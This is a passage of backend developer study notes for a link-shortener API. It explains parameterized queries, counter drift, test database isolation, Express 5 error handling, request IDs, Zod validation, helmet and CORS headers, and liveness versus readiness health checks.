parameter values are sent to Postgres as two separate pieces — Postgres
parses and plans the query structure first, with parameters as
placeholders, and only binds the actual values in afterward as pure data
that's never re-parsed as SQL. A malicious value can't inject new SQL
syntax because it's never in a position to be interpreted as syntax at
all — the query's shape was already fixed before the value entered the
picture. That's a fundamentally stronger guarantee than escaping, which
still depends on a sanitization step being implemented and actually
invoked correctly at every call site, every time.

---

### The click_count denormalization and its drift risk

**What it is.** `links.click_count` stores a running total that's
logically derivable from `COUNT(*) FROM clicks WHERE link_id = $1` — it's
redundant data, kept in sync with (rather than computed fresh from) the
`clicks` table.

**Why it exists in this project.** Reading a link's click count is
expected to be a common, latency-sensitive operation (displaying it on a
dashboard, checking it against `max_clicks` on every redirect). Counting
millions of `clicks` rows on every read doesn't scale the way reading one
already-maintained integer column does — the denormalized counter trades
storage and write-time bookkeeping for cheap, constant-time reads.

**How it works mechanically — right now.** `click_count` is declared with
`default: 0` and a `CHECK (click_count >= 0)` constraint, but nothing in
this phase actually increments it — there's no route or service logic
yet that records a click and bumps the counter atomically. That's
intentionally out of scope for the data layer phase; the column exists and
is constrained correctly, but the write path that keeps it accurate is a
Phase 3+ concern.

**Where it lives in the codebase.** The `click_count` column definition
and its `CHECK` constraint in `migrations/*_create-links-table.ts`.

**Common pitfalls — the drift risk.**

- The fundamental risk of any denormalized counter: it can drift out of
  sync with the table it's summarizing. If a future click-recording code
  path inserts into `clicks` but the corresponding `click_count` increment
  fails, gets skipped, or isn't wrapped in the same transaction as the
  insert, `click_count` silently becomes wrong — and nothing in the schema
  itself would ever detect or flag that drift.
- Incrementing with a read-then-write (`SELECT click_count ...` then
  `UPDATE ... SET click_count = <old value> + 1`) instead of an atomic
  `UPDATE links SET click_count = click_count + 1 WHERE id = $1` — the
  read-then-write version has the exact same race condition problem
  described in the constraints-vs-app-checks section: concurrent clicks on
  a popular link can read the same starting value and both write the same
  incremented result, losing a click.
- Forgetting to wrap the `clicks` insert and the `links.click_count`
  increment in the same transaction — if one succeeds and the other fails,
  the two tables disagree about how many clicks actually happened.

**Production considerations.** The concrete fix once click-recording logic
exists: an atomic `UPDATE ... SET click_count = click_count + 1` (not
read-then-write) inside the same transaction as the `clicks` insert. A
periodic reconciliation job (recomputing `click_count` from an actual
`COUNT(*)` and comparing/correcting) is the usual safety net for
denormalized counters at scale, catching drift from any edge case the
transactional logic didn't anticipate — worth adding once this project has
real click-recording traffic to protect against.

**Interview answer.** `click_count` is a denormalized counter — data
that's logically derivable from counting `clicks` rows, but stored
redundantly on `links` so reading it is a cheap, constant-time column read
instead of an aggregate query over a potentially huge table. The tradeoff
is drift risk: unlike a value computed fresh from source data, a stored
counter can silently disagree with reality if the write path that
maintains it has a bug, a missed transaction boundary, or a race condition
from a non-atomic increment. This phase only defines the column and its
`CHECK (click_count >= 0)` constraint — the actual increment logic is a
later phase's responsibility, and it'll need an atomic `UPDATE ... SET
click_count = click_count + 1` inside the same transaction as the
`clicks` insert, not a read-then-write, to avoid losing increments under
concurrent clicks.

---

### Test database isolation strategies

**What it is.** How to make sure the integration test suite — which, by
design, runs against a _real_ Postgres, not a mock — doesn't corrupt
developer data, doesn't leak state between tests, and still lets DDL
(`CREATE TABLE`/`DROP TABLE`) actually be tested.

**Why it exists in this project.** `DATABASE_URL` in `.env` points at the
same Postgres a developer is using interactively for `npm run dev`.
Running the test suite against that database would truncate or mutate
whatever dev data exists — surprising at best, destructive at worst. And a
single isolation strategy doesn't fit every test in this phase: verifying
migrations actually apply/roll back needs to run real `CREATE
TABLE`/`DROP TABLE` against real schema state, while verifying row-level
constraints (the CHECK constraint, unique index, cascade behavior) needs
each test's inserted rows to disappear before the next test runs, without
needing to drop and recreate the whole schema every time.

**How it works mechanically — two isolation levels, used for different
things.**

- **A separate database** (`clickscope_test`, on the same local Docker
  Postgres — no new container needed) — the outermost layer of isolation,
  keeping the entire test run away from dev data. `.env.test` points at
  it; `tests/globalSetup.ts` creates it if missing and applies every
  migration once, before any test file runs, using node-pg-migrate's
  programmatic `runner()` API — so `npm test` is fully self-contained,
  with no manual "migrate the test database first" step for a new
  contributor.
- **Transaction rollback per test** (`tests/db/constraints.test.ts`) — each
  test runs `BEGIN` before and `ROLLBACK` after, so whatever rows it
  inserts never actually persist, and the next test starts from the same
  clean state without needing a full `TRUNCATE`.
- **Real DDL, no transaction wrapper** (`tests/db/migrations.test.ts`) —
  deliberately the _exception_ to the rollback pattern. Testing that
  migrations actually apply and roll back means running real `CREATE
TABLE`/`DROP TABLE` against real schema state; wrapping that in an outer
  transaction that then gets rolled back would defeat the entire point of
  the test. This is also why `vitest.config.ts` disables `fileParallelism`
  — this test's `down`/`up` cycle temporarily removes the tables
  `constraints.test.ts` depends on, so the two files can't safely run
  concurrently, only sequentially.

**Where it lives in the codebase.** `.env.test`/`.env.test.example`,
`tests/globalSetup.ts`, `fileParallelism: false` in `vitest.config.ts`,
`tests/db/migrations.test.ts` (real DDL), `tests/db/constraints.test.ts`
(transaction-per-test).

**Common pitfalls.**

- Running tests against the same database as local dev — the single most
  important thing this setup avoids; easy to do accidentally by pointing
  `.env.test` at the same database name as `.env`.
- Wrapping a DDL test in a transaction "for consistency with the other
  tests" — `CREATE TABLE`/`DROP TABLE` inside a transaction that later
  rolls back never actually proves the migration works outside a
  transaction, which is how it actually runs in real deploys.
- Enabling test file parallelism without checking whether tests share
  mutable state — fine for pure unit tests with no shared resource, actively
  dangerous for integration tests hitting one real database, where two
  files running concurrently can interleave DDL and DML in ways that make
  failures nondeterministic and hard to reproduce.

**Production considerations.** None directly — this is exclusively a
local/CI testing concern. The pattern does generalize to CI: the same
`tests/globalSetup.ts` logic works unchanged against a fresh Postgres
service container in CI, since it provisions everything it needs (the
database, the schema) itself rather than assuming a pre-existing,
pre-migrated database is already there.

**Interview answer.** I isolate the test suite at two levels, for two
different needs. A dedicated `clickscope_test` database (auto-provisioned
and auto-migrated by a Vitest global setup hook) keeps the entire test run
away from a developer's actual dev data. Within that, most tests wrap in
`BEGIN`/`ROLLBACK` so inserted rows never persist between tests — but the
migration up/down test is a deliberate exception, running real
`CREATE TABLE`/`DROP TABLE` outside any transaction, since that's the only
way to actually prove migrations apply and roll back correctly outside a
transaction, which is how they run for real. Because that test
temporarily removes tables other tests depend on, file-level parallelism
is disabled — a reminder that "run tests in parallel by default" is a
unit-test assumption, not a safe default for integration tests sharing one
real database.

---

## Phase 3: API Foundation

### Operational vs programmer errors, and why AppError is factories, not a class hierarchy

**What it is.** A two-way split for anything that goes wrong while
handling a request. An _operational_ error is one the code deliberately
recognized and threw — bad input, a missing resource, a conflicting
write — where the status, message, and shape are all safe to hand back
to a client as-is. A _programmer_ error is everything else: a bug, an
unhandled edge case, a raw driver exception — something nobody
anticipated, whose real message might contain a stack trace, a SQL
fragment, or an internal file path, and therefore must never reach a
client verbatim.

**Why it exists in this project.** CLAUDE.md is explicit: "Errors thrown
as AppError; the error middleware formats responses." Without a single
recognizable error type, the error middleware would have no reliable way
to tell "a route deliberately rejected this request" apart from "a route
crashed" — and conflating the two either leaks internal detail through
an error that was actually a bug, or shows a client a generic "Internal
Server Error" for what should have been a specific, actionable 404.

**How it works mechanically.** `src/lib/errors.ts` exports one
`AppError extends Error` class (`statusCode`, `code: ErrorCode`,
`isOperational = true` on every instance, `details: unknown = null`)
plus seven factory functions — `badRequest`, `unauthorized`,
`forbidden`, `notFound`, `conflict`, `tooManyRequests`, `internal` — each
just calling `new AppError(...)` with the right status and code baked
in. The operational/programmer boundary is `instanceof AppError`, tested
once, in the error middleware (`src/middleware/errorHandler.ts`):
anything that passes that check is operational and safe to show as-is;
anything that doesn't is a programmer error and gets sanitized in
production. One class plus factories, not a subclass per status code
(`BadRequestError`, `UnauthorizedError`, ...), because a seven-class
hierarchy would only ever differ in the three values already passed as
constructor arguments — it's boilerplate, not a meaningful type
distinction. It also matches this codebase's existing style:
`EnvValidationError` (`src/config/env.ts`) is a single flat class, and
`parseEnv` is a plain function, not part of a class taxonomy.

`details` is declared as a non-optional field defaulting to `null`
(`details: unknown = null`), not `details?: unknown`. tsconfig's
`exactOptionalPropertyTypes` forbids assigning `undefined` into a key
typed `T | undefined` unless the key is entirely omitted — the same
constraint already worked around in `src/lib/logger.ts` and
`src/db/pool.ts` by building objects conditionally. Making `details`
required with a default sidesteps that class of friction entirely rather
than repeating the conditional-key dance a third time.

**Where it lives in the codebase.** `src/lib/errors.ts` (the class and
factories); `src/middleware/errorHandler.ts` (the `instanceof AppError`
check); every future route/service throws these instead of a bare
`Error` or `throw 'string'`.

**Common pitfalls.**

- Throwing a bare `Error` for something that's actually an expected,
  operational case (e.g. `throw new Error('not found')`) — it reaches
  the error middleware as a programmer error, gets sanitized to a
  generic 500 in production, and the client never learns it was
  actually a 404.
- Marking `isOperational` as a mutable, per-call flag instead of a
  constant on the class — the whole point is that _every_ `AppError`,
  including one built via `internal()`, is operational (it was
  deliberately thrown); making it a settable field just invites some
  call site to get it wrong.
- Putting business logic in a subclass constructor (e.g. formatting a
  message differently per error type) — the factories keep that
  formatting at the call site, where the actual context is, instead of
  scattered across N constructors.

**Production considerations.** Because `AppError.message` is always
shown to the client (only non-`AppError` messages get sanitized), the
discipline this requires going forward is: never put anything
client-unsafe into an `AppError`'s message — no SQL fragments, no
internal IDs the client shouldn't correlate, no stack-trace-adjacent
detail. That detail belongs in the `details` field only when it's
genuinely meant for the client (e.g. per-field validation errors), or in
the server-side log call in `errorHandler.ts`, never in the message
itself if there's any doubt.

**Interview answer.** I distinguish operational errors — expected,
deliberately-thrown failures like bad input or a missing resource —
from programmer errors, which are bugs or unanticipated exceptions,
using a single `instanceof AppError` check in the error middleware.
Every `AppError` is safe to show a client as-is; anything else gets
sanitized to a generic message in production and logged in full detail
server-side. I use one `AppError` class plus factory functions for the
common cases rather than a subclass per error type, since a class
hierarchy here would just be seven constructors differing only in the
values already passed as arguments — more boilerplate for the same
information.

---

### The error middleware's 4-argument signature and registration order

**What it is.** Express identifies error-handling middleware purely by
counting a function's declared parameters: exactly four —
`(err, req, res, next)` — marks it as an error handler; any other arity
is treated as regular middleware. Registration order then decides
which errors actually reach it.

**Why it exists in this project.** CLAUDE.md requires a single
centralized error handler that formats every response consistently. That
only works if Express reliably routes every thrown/forwarded error to
this one function — which depends on getting both the signature and the
position right, neither of which produces a helpful error if wrong.

**How it works mechanically.** At startup, Express inspects
`fn.length` for each middleware function passed to `app.use()`. `fn.length`
is a normal JavaScript runtime property equal to the number of
parameters declared before the first one with a default value or rest
syntax — TypeScript's type annotations don't change it, since types are
erased at compile time; only the actual parameter count in the compiled
JS matters. `createErrorHandler` in `src/middleware/errorHandler.ts`
returns a function with exactly four declared parameters
`(err, req, res, _next)` for this reason — `_next` is never called
inside the function body (the handler ends the response itself via
`res.json`), but it can't be removed, because doing so drops the arity
to three and Express silently stops treating it as an error handler at
all: no warning, no error, the app just falls through to Express's own
default HTML error page instead of this app's JSON shape.

Registration order matters independently of arity. Express matches
middleware top-to-bottom in registration order and only diverts into
error-handling middleware once something calls `next(err)` (or an async
handler's returned promise rejects — see the next section) — it never
retroactively looks backward for an error handler registered earlier.
Concretely, in `src/app.ts`, the error handler is the very last thing
registered, strictly after every route and after `notFoundHandler`: if
it were registered before a route, Express simply hasn't reached that
registration yet when the route's error occurs, so the error has nowhere
defined to go.

**Where it lives in the codebase.** `createErrorHandler` in
`src/middleware/errorHandler.ts`; registered last in `src/app.ts`, after
the root/health routers and after `notFoundHandler`.

**Common pitfalls.**

- Removing an unused `next` parameter from an error handler "for
  cleanliness" — silently downgrades it to regular middleware. Symptom:
  errors start rendering as Express's default HTML error page instead of
  the app's JSON shape, with no warning anywhere in the logs.
- Registering the error handler before a route or before
  `notFoundHandler` — errors from anything registered after it never
  reach it. Symptom: unmatched routes or route errors produce Express's
  default response instead of the expected JSON shape, but only for
  routes registered after the misplaced handler, which is a confusing,
  partial failure to debug.
- Registering more than one 4-arg error handler — the first one in
  registration order runs and, if it doesn't call `next(err)` itself
  (this app's doesn't), consumes the error; any later error handlers
  never run.

**Production considerations.** A common mistake at scale is adding a
second, feature-specific error handler for one route group instead of
teaching the one centralized handler about a new error shape — this
fragments the "every endpoint returns errors in one consistent shape"
contract CLAUDE.md asks for. If a future error type needs special
handling, it should extend `AppError`'s vocabulary (a new `ErrorCode`,
or a new factory), not spawn a second error-handling middleware.

**Interview answer.** Express recognizes error-handling middleware by
counting its declared parameters — exactly four, `(err, req, res, next)`
— rather than by any explicit registration API. That's a runtime
JavaScript property (`Function.prototype.length`), so even an unused
`next` parameter can't be dropped without silently losing error-handler
status. Registration order matters separately: Express matches
middleware top-to-bottom and only diverts into an error handler once
something calls `next(err)`, so the error handler has to be registered
strictly after every route it's meant to protect, or those routes'
errors have nowhere to go.

---

### Express 5's automatic async error propagation

**What it is.** When a route or middleware handler returns a Promise
(i.e. it's an `async` function), Express 5 automatically attaches a
`.catch()` to it that forwards any rejection into `next(err)` — the same
path a synchronous `throw` has always used. No manual try/catch or
wrapper library required for the error to reach the error middleware.

**Why it exists in this project.** Every route handler written from
Phase 3 onward is expected to be `async` and to just `throw` an
`AppError` on failure — CLAUDE.md's "Errors thrown as AppError" pattern
only stays this simple if that throw is guaranteed to reach the error
middleware without extra boilerplate at every call site.

**How it works mechanically.** In Express 4, an `async` handler that
threw produced an unhandled promise rejection Express never saw — the
request would hang with no response ever sent, unless the handler
manually did `try { ... } catch (err) { next(err) }`, or was wrapped in
a helper like `express-async-handler`. Express 5 changed the internal
route-dispatch code to check whether a handler's return value is a
Promise, and if so, calls `.then(undefined, next)` on it (functionally
equivalent to `.catch(next)`) — so a rejected promise now flows into the
exact same `next(err)` path a synchronous throw always used, with zero
code change required at the call site.

`tests/middleware/asyncErrors.test.ts` proves this directly rather than
asserting it from documentation: it builds a small Express app with an
`async` route handler that `throw`s, with genuinely no try/catch and no
wrapper anywhere, and asserts the response is the error middleware's
properly formatted JSON — which is only possible if the rejection
actually reached it.

**Where it lives in the codebase.** No dedicated file — this is Express
5's own dispatch behavior. Every `async` route handler across the
codebase (present and future) relies on it implicitly; the proof lives
in `tests/middleware/asyncErrors.test.ts`.

**Common pitfalls.**

- Wrapping every async handler in a manual `try/catch { next(err) }` or
  an `asyncHandler` utility out of Express-4 habit — harmless but dead
  weight on Express 5; worth knowing it's no longer necessary so it
  doesn't get reintroduced as unnecessary boilerplate on every route.
- Assuming this covers _every_ way an async handler can fail — it only
  catches the promise the handler itself returns. An error thrown
  asynchronously from inside a detached callback that isn't awaited
  (e.g. a stray `setTimeout` or a fire-and-forget `.then()` inside the
  handler) still becomes an unhandled rejection Express never sees,
  exactly like Express 4.
- Relying on this in code that must also run under Express 4 (a shared
  library, for instance) — this is an Express-5-specific dispatch
  change, not a JavaScript language guarantee; Express-4-targeted code
  still needs the manual `next(err)` pattern.

**Production considerations.** This removes an entire class of
production incident that Express-4-era codebases hit constantly:
requests silently hanging until a load balancer's timeout kills the
connection, with nothing useful in the logs because the rejection was
never caught anywhere. Express 5 turns that failure mode into a normal,
logged, correctly-shaped error response instead.

**Interview answer.** In Express 4, an async route handler that threw
produced an unhandled promise rejection Express never saw — the request
would hang forever unless the handler manually caught the error and
called `next(err)`, which is why wrapper libraries like
`express-async-handler` existed. Express 5 changed route dispatch to
detect when a handler returns a Promise and automatically forward any
rejection into `next(err)`, the same path a synchronous throw always
used. Practically, this means every route handler in this codebase can
just be `async` and `throw` an `AppError` directly, with no try/catch or
wrapper boilerplate — and I proved this behavior with a test rather than
assuming it, since it's easy to get backwards for a codebase that used
to run on Express 4.

---

### Correlation IDs and request-scoped structured logging

**What it is.** A unique ID generated (or inherited) per incoming
request, attached to the request object, echoed back in a response
header, and stamped onto every log line that request produces — so every
line belonging to one request can be found and grouped, even in a busy,
concurrent log stream.

**Why it exists in this project.** Structured logging alone (Phase 1)
tells you _what_ happened; it doesn't tell you which log lines belong
together. In production, log lines from many concurrent requests
interleave in the aggregate stream. Without a shared ID stamped on every
line one request produces, reconstructing "everything that happened for
this one failing request" means grepping by approximate timestamp and
hoping nothing else happened in that window.

**How it works mechanically.** `src/middleware/requestContext.ts`,
registered first in `src/app.ts`, reads an inbound `X-Request-Id` header
(accepted, but capped at 200 characters — see pitfalls) or generates a
fresh one via `crypto.randomUUID()` (a Node builtin, no new dependency).
It assigns `req.id`, creates `req.log = logger.child({ requestId: id })`
— Pino's `child()` returns a logger that automatically includes
`requestId` in every subsequent call without it being re-passed each
time — and sets the `X-Request-Id` response header so a client (or an
upstream gateway) can correlate its own logs against this service's. It
logs "Request started" immediately, and logs "Request completed" (with
method, path, status, duration) on the response's `finish` event, which
fires exactly once the response has actually been fully sent —
including responses written later by the error handler — so completion
is logged exactly once regardless of whether the request succeeded or
errored.

**Where it lives in the codebase.** `src/middleware/requestContext.ts`;
the `id`/`log` fields on `Request` are declared in
`src/types/express.d.ts`; every downstream handler and the error handler
(`src/middleware/errorHandler.ts`) use `req.log` instead of the bare
`logger` singleton so their lines carry the same ID.

**Common pitfalls.**

- Accepting an inbound `X-Request-Id` with no bound on its length or
  content — it's attacker-controlled input flowing directly into
  structured logs otherwise; this codebase caps it at 200 characters as
  a cheap defense against log-injection/log-bloat via an oversized
  header value.
- Logging completion inside a `try/finally` around `next()` instead of
  on `res.on('finish', ...)` — `next()` returning doesn't mean the
  response has actually been sent yet (a downstream handler might still
  be awaiting a DB call), so a `finally` block would log "completed"
  before the response is truly finished, and would run even if a later
  handler kept the request open indefinitely.
- Using the bare `logger` singleton instead of `req.log` inside a route
  handler — works, but produces a log line with no `requestId`, breaking
  the exact correlation this middleware exists to provide.

**Production considerations.** Accepting (not just generating) an
inbound `X-Request-Id` is what makes correlation work _across_ service
boundaries, not just within this one process — an API gateway, load
balancer, or the frontend itself can set the header, and it stays stable
end-to-end. When a user reports "it broke," the `requestId` returned in
every error response body (see the error middleware) is exactly what
they can hand to support to jump straight to the right log lines,
instead of reconstructing a timeline from timestamps.

**Interview answer.** I attach a UUID to every request — accepting an
inbound `X-Request-Id` if one's already set upstream, generating a fresh
one with `crypto.randomUUID()` otherwise — and use it to create a
Pino child logger (`logger.child({ requestId })`) attached to the
request object, so every log line produced while handling that request
automatically carries the same ID without it being re-passed manually
at each call site. The ID is echoed back in a response header and
included in every error response body, so correlating "this one user's
failing request" across a stream of interleaved, concurrent log output
is a single grep instead of a timestamp guessing game.

---

### Boundary validation with Zod, and why validated data lives on req.validated

**What it is.** Middleware that runs a Zod schema against
`req.body`, `req.query`, or `req.params` before a route handler ever
runs, rejecting the request with a 400 and field-level detail if it
fails, and making the parsed (typed, defaulted, coerced) result
available to the handler if it succeeds.

**Why it exists in this project.** CLAUDE.md requires "All input
validated with Zod at the route boundary" — not inside services. A
service function should be callable from anywhere: a route, a future
BullMQ worker job, a test, a seed script — none of which necessarily
have HTTP-request-shaped input to validate against. If Zod validation
lived inside a service instead, every caller would need to construct
request-shaped input just to satisfy a schema that only makes sense for
HTTP, even a worker job that never touched HTTP at all. Validating at
the boundary means services can trust plain, already-valid argument
types unconditionally.

**How it works mechanically.** `src/middleware/validate.ts` exports
`validateBody`, `validateQuery`, `validateParams`, each a thin wrapper
around one internal `makeValidator(schema, target)`. It calls
`schema.safeParse(req[target])` — `safeParse`, not `parse`, so a failure
is a normal return value, not a thrown exception the middleware would
have to catch. On failure, it maps every Zod issue into
`{ field, message }` and forwards `badRequest('Validation failed', details)`
into the centralized error middleware, rather than writing a one-off
response — so validation failures get the exact same JSON error shape
every other error does. On success, it writes the parsed value onto
`req.validated[target]` (declared in `src/types/express.d.ts`) — **not**
back onto `req.body`/`req.query`/`req.params` directly. That's a
constraint, not a style choice: Express 5's `req.query` is a getter-only
accessor with no setter (`node_modules/express/lib/request.js`), and
`req.query = {...}` throws a `TypeError` under this project's ESM/strict
execution — confirmed directly, not assumed. `req.body`/`req.params`
happen to still be plain writable properties, but using one mechanism
(`req.validated`) for all three avoids an arbitrary asymmetry between
them that would need to be remembered and explained per-target.

**Where it lives in the codebase.** `src/middleware/validate.ts`;
`req.validated`'s type is declared in `src/types/express.d.ts`;
`tests/middleware/validate.test.ts` exercises all three targets,
including proving query validation specifically works despite the
getter constraint.

**Common pitfalls.**

- Using `schema.parse()` instead of `safeParse()` inside the middleware
  — `parse` throws on failure, and while Express 5 would still forward
  that throw to the error middleware (it's a synchronous throw, always
  forwarded), the resulting error would be Zod's raw `ZodError`, not a
  `badRequest(...)` with field-level detail — losing the specific,
  client-useful shape this middleware exists to produce.
- Returning Zod's raw `issue.path`/`issue.code` structure to the client
  — it's an internal representation (arrays of path segments, Zod-
  specific issue codes) not designed as an API contract; mapping to
  `{ field, message }` is deliberate, not incidental.
- Trying to mutate `req.query` directly out of Express-4 habit — throws
  immediately in this codebase's ESM/strict execution, not a silent
  no-op (which is what happens under CommonJS/sloppy mode, making this
  an easy trap if tested under the wrong module system).

**Production considerations.** Every future feature route (auth, links,
redirects) is expected to compose `validateBody`/`validateQuery`/
`validateParams` in its route definition — e.g.
`router.post('/links', validateBody(createLinkSchema), handler)` — and
read `req.validated.body` inside the handler, narrowed with
`z.infer<typeof createLinkSchema>`. Keeping this middleware generic
(schema-in, target-out) rather than route-specific means every future
route gets the same 400 shape and the same field-level detail for free.

**Interview answer.** I validate `body`/`query`/`params` at the route
boundary with reusable Zod middleware, because a service function should
be callable from anywhere — a route, a worker job, a test — without
needing HTTP-shaped input to satisfy a validator that only makes sense
for HTTP requests. On failure it returns a 400 with field-level detail
mapped from Zod's issues, not a raw Zod error dump. On success, it
writes the parsed value onto a separate `req.validated` object rather
than mutating `req.body`/`req.query` in place — partly for consistency,
but also because Express 5's `req.query` is actually a getter-only
property with no setter, so reassigning it directly throws.

---

### helmet and CORS: what each actually protects against

**What it is.** Two unrelated pieces of browser-facing security
middleware bundled together here only because they're both registered
early in the middleware chain: `helmet` sets a battery of security-
related response headers; `cors` controls which cross-origin JavaScript
is allowed to read this API's responses.

**Why it exists in this project.** This is a REST API consumed by a
separate Next.js frontend running on a different origin — cross-origin
requests are the normal case here, not an edge case, so CORS has to be
configured deliberately rather than left at a default. Response headers
that harden against common browser-side attack classes (clickjacking,
MIME-sniffing, protocol downgrade) cost nothing to add and have no
reason not to be on by default.

**How it works mechanically.** `helmet()` (`src/middleware/security.ts`)
applies its default header set to every response — concretely:
`Strict-Transport-Security` forces the browser to always use HTTPS for
this origin afterward, blocking SSL-stripping downgrade attacks;
`X-Content-Type-Options: nosniff` stops the browser from MIME-sniffing a
response into executing as something other than its declared
`Content-Type`; the default `Content-Security-Policy` restricts which
origins scripts/styles may load from, shrinking XSS blast radius;
`X-Frame-Options`/the `frame-ancestors` CSP directive blocks this page
from being embedded in another site's `<iframe>`, mitigating
clickjacking; `Referrer-Policy` limits how much of this API's URLs leak
to third parties via the `Referer` header.

`cors({ origin: config.CORS_ORIGIN })` handles the `Access-Control-*`
header exchange, including the browser-issued preflight `OPTIONS`
request that precedes many cross-origin calls — correctly reflecting
the request's origin only if it's in the allowed list, and setting
`Vary: Origin` so shared caches don't serve one origin's CORS headers to
another. `config.CORS_ORIGIN` (`src/config/env.ts`) is a required,
comma-separated-then-array-parsed list of explicit origins, validated at
startup to reject `*` via a Zod `.refine()` — so a wildcard fails fast
with the same `EnvValidationError` path any other invalid env var uses,
rather than silently shipping something permissive. It's parsed as an
array specifically so more than one legitimate frontend origin (a
production URL and a deployed preview URL, for instance) can be
allowlisted simultaneously without a code change — just a comma-
separated env value.

Critically: CORS is a **browser-enforced** restriction on which
origins' JavaScript may _read_ a cross-origin response. It does nothing
to stop a non-browser client — `curl`, a server-to-server call, Postman
— from calling this API directly; the request still executes
server-side regardless of any CORS header. It is not an authentication
or authorization mechanism, and never should be treated as one.

**Where it lives in the codebase.** `src/middleware/security.ts`
(`securityHeaders`, `corsMiddleware`); `CORS_ORIGIN` in
`src/config/env.ts`, `.env`/`.env.example`/`.env.test`; registered in
`src/app.ts` right after `requestContext`, before body parsing and
routes.

**Common pitfalls.**

- Setting `Access-Control-Allow-Origin: *` "to make CORS errors go
  away" during development and shipping it — it tells every website's
  JavaScript, from any origin, that it may read this API's responses in
  a victim user's browser session. If this API ever adds cookie-based
  auth, a wildcard origin combined with `credentials: true` is
  specifically forbidden by the CORS spec (browsers refuse that
  combination outright) — but even without credentials, a wildcard
  removes origin allowlisting entirely for an API with a known, fixed
  set of legitimate frontends.
- Mistaking a passing CORS-configured request for "this request is
  authenticated" — CORS controls whether a _browser_ lets JavaScript
  read the response; it says nothing about who or what sent the
  request.
- Forgetting the preflight `OPTIONS` request when hand-rolling CORS
  headers instead of using the `cors` package — a surprisingly common
  source of "works with curl, fails from the browser" bugs, which is
  the concrete reason `cors` was added as a dependency instead of
  setting headers by hand.

**Production considerations.** As auth is added in a later phase, the
decision on cookie- vs bearer-token-based sessions directly determines
whether `corsMiddleware`'s `credentials` option needs to flip to `true`
— deliberately left at its default (`false`) for now, since turning it
on prematurely would widen the security surface before there's any
mechanism to explain why. `CORS_ORIGIN` being a list (not a single
string) is what lets a preview-deployment origin be added alongside
production without touching code — just the env var.

**Interview answer.** Helmet sets a set of response headers that harden
against common browser-side attacks with no functional cost — HSTS
against downgrade attacks, `nosniff` against MIME-sniffing XSS, a
restrictive CSP, frame-ancestors against clickjacking. CORS is
different: it's a browser-enforced rule about which origins' JavaScript
may read this API's responses, configured here from an explicit,
required, non-wildcard list of allowed origins. The key thing I make
sure not to conflate: CORS doesn't stop a non-browser client from
calling the API directly — the request executes either way — so it's a
browser-safety mechanism, not an authentication boundary, and a
wildcard origin is dangerous specifically because it removes that
safety for every site on the internet at once.

---

### Health checks: liveness vs readiness, and why 503 not 200-with-a-status-field

**What it is.** Two different questions an orchestrator needs answered
about a running instance, each requiring a different HTTP endpoint and a
different recovery action when the answer is "no": liveness ("is this
process alive at all?") and readiness ("can this instance currently
serve real traffic?").

**Why it exists in this project.** `GET /` (liveness, unchanged from
Phase 1, now under `src/routes/root.ts`) and `GET /health` (readiness,
new this phase) answer genuinely different questions, and conflating
them causes a specific, well-known production failure mode: if
dependency checks were wired into the liveness endpoint, a transient
Postgres blip would make liveness fail, and an orchestrator's correct
response to failed liveness is to kill and restart the container —
producing a restart-crash-loop over an external outage that restarting
the process can't fix.

**How it works mechanically.** `GET /` (`src/routes/root.ts`) does zero
dependency checks — it just proves the process can respond to HTTP at
all, which is exactly what a liveness probe should verify: if it fails,
the process itself is presumed broken, and killing/restarting it is the
right move. `GET /health` (`src/routes/health.ts`) calls
`getHealthReport()` (`src/services/health.ts`), which runs
`checkDatabaseHealth()` (`src/db/health.ts`, existing) and
`checkRedisHealth()` (new, `src/lib/redis.ts`) concurrently via
`Promise.all`, timing each with `process.hrtime.bigint()`. Both
underlying checks already catch their own errors internally and return
a plain `boolean` — so `getHealthReport` has nothing that can reject,
satisfying "a health check that must never throw" structurally, not by
convention. The route returns `200` when every dependency is `ok`, `503`
when any is not — status code, not a `status` field the client would
have to parse — specifically because a standard orchestrator health
check keys off the HTTP status alone; requiring it to also parse a JSON
body to know the instance is unhealthy is an unnecessary, easy-to-get-
wrong extra step for infrastructure that's checking thousands of
instances a minute. The response body still names each dependency's
individual status and latency, for a human debugging a `degraded`
result — just not as the sole signal.

**Where it lives in the codebase.** `src/routes/root.ts` (liveness),
`src/routes/health.ts` + `src/services/health.ts` (readiness),
`src/db/health.ts` + `src/lib/redis.ts` (the two individual dependency
checks).

**Common pitfalls.**

- Wiring dependency checks into the liveness endpoint instead of a
  separate readiness endpoint — causes the restart-crash-loop failure
  mode described above; this is the single most important reason the two
  are kept as genuinely separate routes rather than one endpoint with a
  query parameter.
- Returning `200` with `{ status: 'error' }` in the body instead of a
  real `503` — technically informative to a human reading the JSON, but
  invisible to any infrastructure that only checks the HTTP status code,
  which is the overwhelming majority of health-check consumers (load
  balancers, container orchestrators, uptime monitors).
- Letting a health check itself throw on a downstream failure — turns a
  single dependency outage into the health endpoint _also_ being down,
  which is strictly worse than an accurate `503`, since it can look like
  the whole service crashed rather than one specific dependency being
  unreachable.

**Production considerations.** `getHealthReport`'s "never throws"
property depends entirely on `checkDatabaseHealth`/`checkRedisHealth`
each continuing to catch internally — if either check is ever rewritten
to let an error propagate, `getHealthReport`'s `Promise.all` would
reject, and the route (being `async`, per the previous section on
Express 5) would still produce a response rather than hanging — but a
generic sanitized 500 via the error middleware, not the specific,
per-dependency `503` this endpoint is designed to return. This is
exercised directly in `tests/routes/health.test.ts` by deliberately
breaking the contract and confirming Express 5's automatic forwarding
is a working backstop, not just a hope.

That same test file also has a smaller, deliberate asymmetry worth
calling out: `checkDatabaseHealth` is mocked (via `vi.mock`) so both the
`ok` and `error` branches are producible on demand — a currently-healthy
local Postgres can't be made to fail on command — while
`checkRedisHealth` is left unmocked and hits the real local Redis
container. Mocking both would be more internally consistent, but it
would mean nothing in the test suite ever proves the real `ioredis`
client actually connects and speaks the protocol correctly end-to-end;
keeping one dependency real, even at the cost of the asymmetry, is worth
that assurance. The direct consequence: this test currently assumes a
live local Redis (via `docker-compose up -d`), exactly the same
assumption `tests/db/*.test.ts` already make about Postgres. Whichever
CI environment eventually runs this suite (a future phase's concern)
will need a Redis service container provisioned alongside the Postgres
one it already needs — not a new category of CI requirement, just an
additional instance of one that already exists.

**Interview answer.** Liveness answers "is the process running at all,"
and the correct response to failure is to kill and restart the
container. Readiness answers "can this instance serve real traffic
right now," and the correct response to failure is to stop routing
traffic to it without restarting — restarting won't fix an external
database outage, so conflating the two causes a restart-crash-loop on
every transient dependency blip. I implement `/health` as the readiness
check — parallel Postgres and Redis pings, each already catching its own
errors so the endpoint itself can never throw — and return a real `503`
status rather than `200` with an error field in the body, because
standard health-check infrastructure keys off the HTTP status alone.

---

